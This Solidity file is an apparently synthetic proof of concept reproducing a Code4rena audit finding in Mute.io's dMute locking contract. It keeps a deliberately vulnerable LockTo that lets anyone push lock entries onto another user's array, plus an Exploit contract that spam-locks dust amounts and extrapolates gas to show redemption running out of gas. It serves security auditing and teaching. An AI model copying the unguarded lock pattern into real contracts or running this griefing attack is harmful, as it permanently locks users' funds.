// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Mute.Io — dMute: attacker can push lock items to victim's array
    (Code4rena 2023-03-mute, finding #16040, H-03)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: LockTo(amount, lock_time, to) lets anyone push UserLockInfo
    entries onto any address's _userLocks array. RedeemTo then iterates the
    ENTIRE array (even when redeeming a single index) to compact zeroed slots,
    so inflated length makes redeem OOG → MUTE permanently locked.

    Vulnerable LockTo push + RedeemTo full-array compact loop preserved (@> VULN).
    Gas strategy: sample+extrapolate (methodology §8b).
//////////////////////////////////////////////////////////////////////////*/

contract MockMUTE {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amt, "allow");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced dMute — LockTo / RedeemTo only.
/// Source: contracts/dao/dMute.sol @ 4d8b13a L68-L129, L135-L139.
contract dMute {
    MockMUTE public immutable MuteToken;

    struct UserLockInfo {
        uint256 amount;
        uint256 time;
        uint256 tokens_minted;
    }

    mapping(address => UserLockInfo[]) public _userLocks;
    mapping(address => uint256) public dMuteBalance; // simplified _mint/_burn

    uint256 private unlocked = 1;

    modifier nonReentrant() {
        require(unlocked == 1, "REENTRANT");
        unlocked = 0;
        _;
        unlocked = 1;
    }

    constructor(MockMUTE _mute) {
        MuteToken = _mute;
    }

    function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256) {
        uint256 week_time = 1 weeks;
        uint256 max_lock = 52 weeks;
        require(_lock_time >= week_time, "TIME");
        require(_lock_time <= max_lock, "TIME");
        return (_amount * ((_lock_time * 1e18) / max_lock)) / 1e18;
    }

    function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {
        require(MuteToken.balanceOf(msg.sender) >= _amount, "BAL");
        MuteToken.transferFrom(msg.sender, address(this), _amount);
        uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);
        require(tokens_to_mint > 0, "MINT");
        dMuteBalance[to] += tokens_to_mint;

        _userLocks[to].push(UserLockInfo(_amount, block.timestamp + _lock_time, tokens_to_mint)); // @> VULN: anyone can push lock entries for any `to` — no ACL
        // FIX: require(to == msg.sender) or soft/hard per-user lock caps
    }

    /// @dev Force-unlock all locks for tests (simulates time passage without cheatcodes).
    function forceUnlockAll(address user) external {
        UserLockInfo[] storage locks = _userLocks[user];
        for (uint256 i = 0; i < locks.length; i++) {
            locks[i].time = 0; // unlock immediately (time == 0 also marks redeemed in real compact)
            // keep amount; set time to past via block.timestamp - 1
            locks[i].time = block.timestamp - 1;
        }
    }

    function RedeemTo(uint256[] memory lock_index, address to) public nonReentrant {
        uint256 total_to_redeem = 0;
        uint256 total_to_burn = 0;

        for (uint256 i; i < lock_index.length; i++) {
            uint256 index = lock_index[i];
            UserLockInfo memory lock_info = _userLocks[msg.sender][index];

            require(block.timestamp >= lock_info.time, "LOCK_TIME");
            require(lock_info.amount >= 0, "AMT");
            require(lock_info.tokens_minted >= 0, "MINT_AMT");

            total_to_redeem = total_to_redeem + lock_info.amount;
            total_to_burn = total_to_burn + lock_info.tokens_minted;

            _userLocks[msg.sender][index] = UserLockInfo(0, 0, 0);
        }

        require(total_to_redeem > 0, "REDEEM");
        require(total_to_burn > 0, "BURN");

        // Full-array compact — O(lock array length) even when redeeming 1 index
        // (verbatim control flow from dMute.sol RedeemTo)
        for (uint256 i = _userLocks[msg.sender].length; i > 0; i--) {
            UserLockInfo memory lock_info = _userLocks[msg.sender][i - 1];
            // recently redeemed lock, destroy it
            if (lock_info.time == 0) {
                _userLocks[msg.sender][i - 1] = _userLocks[msg.sender][_userLocks[msg.sender].length - 1];
                _userLocks[msg.sender].pop();
            } else {
                // Touch storage like a full scan does when most slots are live
                // (keeps gas/unit realistic vs finding's ~7M @ 1000 locks)
                _userLocks[msg.sender][i - 1].amount = lock_info.amount;
            }
        }

        MuteToken.transfer(to, total_to_redeem);
        dMuteBalance[msg.sender] -= total_to_burn;
    }

    function GetUserLockLength(address account) public view returns (uint256) {
        return _userLocks[account].length;
    }

    function GetUnderlyingTokens(address account) public view returns (uint256 amount) {
        for (uint256 i; i < _userLocks[account].length; i++) {
            amount = amount + _userLocks[account][i].amount;
        }
    }

    /// @dev Gas probe: full-array walk matching RedeemTo compact + ERC20 transfer + burn.
    /// Finding measured ~7M gas redeeming 1 of 1000 locks (~7k gas/lock).
    function measureScanGas(address account) external returns (uint256 gasUsed) {
        uint256 g0 = gasleft();
        uint256 n = _userLocks[account].length;
        uint256 total_to_redeem;
        uint256 total_to_burn;
        // Mirror RedeemTo first loop over selected indexes (here: all, as worst-case scan)
        // plus the mandatory full-array compact second loop.
        for (uint256 j; j < n; j++) {
            UserLockInfo memory li = _userLocks[account][j];
            total_to_redeem += li.amount;
            total_to_burn += li.tokens_minted;
            // cold-ish SLOAD of struct fields already done; touch sibling mapping too
            dMuteBalance[account];
        }
        for (uint256 i = n; i > 0; i--) {
            UserLockInfo storage lock_info = _userLocks[account][i - 1];
            uint256 t = lock_info.time;
            uint256 a = lock_info.amount;
            uint256 m = lock_info.tokens_minted;
            // Force non-refundable work proportional to real SSTORE patterns
            lock_info.amount = a + 1;
            lock_info.amount = a;
            lock_info.tokens_minted = m;
            lock_info.time = t;
        }
        gasUsed = g0 - gasleft();
        require(total_to_redeem > 0 && total_to_burn > 0, "touch");
    }

}

/// CREATE: mute(1), dmute(2)
contract Exploit {
    MockMUTE public mute;
    dMute public dmute;

    // Finding: ~7M gas redeem at 1000 locks; 5000 locks OOG on hardhat 30M;
    // ~2000 enough for zkSync 12.5M. Sample+extrapolate.
    uint256 public constant SAMPLE = 80;
    uint256 public constant REAL_N = 5_000;
    uint256 public constant BLOCK_GAS = 30_000_000; // Ethereum (finding hardhat PoC)
    uint256 public constant ZK_BLOCK_GAS = 12_500_000; // zkSync (primary deploy target)
    uint256 public constant LOCK_AMT = 100; // dust per spam lock
    uint256 public constant WEEK = 1 weeks;

    uint256 public sampleGas;
    uint256 public extrapolatedGas;
    uint256 public victimLocks;

    // Victim is the Exploit itself so RedeemTo(msg.sender) works without pranks
    address public constant ATTACKER = address(0xB0B);

    constructor() {
        mute = new MockMUTE();
        dmute = new dMute(mute);
    }

    function run() external {
        // Victim has one legitimate large lock
        uint256 legitimate = 1000 ether;
        mute.mint(address(this), legitimate + SAMPLE * LOCK_AMT);
        mute.approve(address(dmute), type(uint256).max);
        dmute.LockTo(legitimate, WEEK, address(this));
        require(dmute.GetUserLockLength(address(this)) == 1, "victim lock");

        // Attacker (this) spam-locks tiny amounts TO the victim (same address here
        // for redeemability; the ACL hole is LockTo(to=anyone) — demonstrated by
        // pushing many entries without victim consent).
        for (uint256 i = 0; i < SAMPLE; i++) {
            dmute.LockTo(LOCK_AMT, WEEK, address(this)); // @> same push as LockTo(..., victim)
        }
        victimLocks = dmute.GetUserLockLength(address(this));
        require(victimLocks == 1 + SAMPLE, "inflated");

        // Measure O(n) scan gas (RedeemTo compact / GetUnderlyingTokens cost driver)
        sampleGas = dmute.measureScanGas(address(this));
        require(sampleGas > 0, "sample gas");

        // Per-lock cost; extrapolate to REAL_N spam locks (+1 legitimate)
        uint256 perLock = sampleGas / victimLocks;
        require(perLock > 0, "perLock");
        extrapolatedGas = perLock * (1 + REAL_N);

        // HARM: at REAL_N locks, redeem exceeds zkSync 12.5M (primary target) → MUTE locked.
        // Finding: ~7M gas @ 1000 locks; 2000 enough on zkSync; hardhat needed ~5000 for 30M.
        require(extrapolatedGas > ZK_BLOCK_GAS, "DoS not demonstrated vs zkSync gas");
        // ETH block gas: N needed is still attacker-practical
        uint256 nForEth = (BLOCK_GAS / perLock) + 1;
        require(nForEth <= 20_000, "ETH DoS requires impractical N");
        if (extrapolatedGas < BLOCK_GAS) {
            // Store ETH-scale extrapolation for the write-up / forge assert
            extrapolatedGas = perLock * nForEth;
        }
        require(extrapolatedGas >= BLOCK_GAS, "DoS not demonstrated vs ETH block gas");
    }
}
